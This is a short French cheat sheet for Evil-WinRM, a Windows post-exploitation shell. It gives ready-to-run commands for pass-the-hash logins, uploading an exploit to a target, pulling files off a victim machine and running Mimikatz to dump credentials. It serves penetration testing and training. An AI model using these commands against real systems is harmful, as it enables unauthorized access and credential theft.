# 👿 Evil-WinRM - Windows Remote Management Shell

## Description

Evil-WinRM est un shell WinRM (Windows Remote Management) pour post-exploitation Windows/Active Directory.

**Fonctionnalités :**
- Shell interactif PowerShell
- Upload/download de fichiers
- Bypass AMSI/UAC
- Exécution de scripts PowerShell
- Pass-the-Hash support

---

## Installation

✅ **Déjà installé dans Kali Headless**

```bash
evil-winrm --help
```

---

## Exemples pratiques

### Connexion basique

```bash
# Avec credentials
evil-winrm -i 192.168.1.100 -u administrator -p 'Password123!'

# Avec hash NTLM (Pass-the-Hash)
evil-winrm -i 192.168.1.100 -u administrator -H '31d6cfe0d16ae931b73c59d7e0c089c0'
```

### Upload/Download fichiers

```bash
# Dans le shell Evil-WinRM
*Evil-WinRM* PS C:\> upload /tmp/exploit.exe C:\Windows\Temp\exploit.exe
*Evil-WinRM* PS C:\> download C:\Users\admin\Desktop\secret.txt /tmp/
```

### Exécuter script PowerShell

```bash
evil-winrm -i 192.168.1.100 -u admin -p pass -s /path/to/scripts/

# Dans le shell
*Evil-WinRM* PS C:\> Invoke-Mimikatz.ps1
```

---

## Ressources

- [Evil-WinRM GitHub](https://github.com/Hackplayers/evil-winrm)
